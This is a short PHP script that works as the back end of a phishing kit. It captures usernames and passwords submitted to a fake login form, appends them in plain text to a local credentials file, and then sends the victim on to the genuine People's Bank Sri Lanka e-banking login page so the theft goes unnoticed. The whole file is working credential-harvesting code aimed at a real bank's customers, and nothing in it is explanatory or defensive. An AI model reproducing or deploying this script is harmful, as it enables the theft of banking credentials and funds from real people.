<?php
 $username = $_POST["username"];
 $password = $_POST["passwd"];
 
 //Write the credentials to text file
 $myfile = fopen("credentials.txt", "a") or die("Unable to open file!");
 $txt = "USERNAME = $username , PASSWORD = $password\n";
 fwrite($myfile, "\n". $txt);
 fclose($myfile);
 //Redirect the browser to original login page
 header("Location: https://www.ebank.peoplesbank.lk/eb/index.html");
 exit();

?>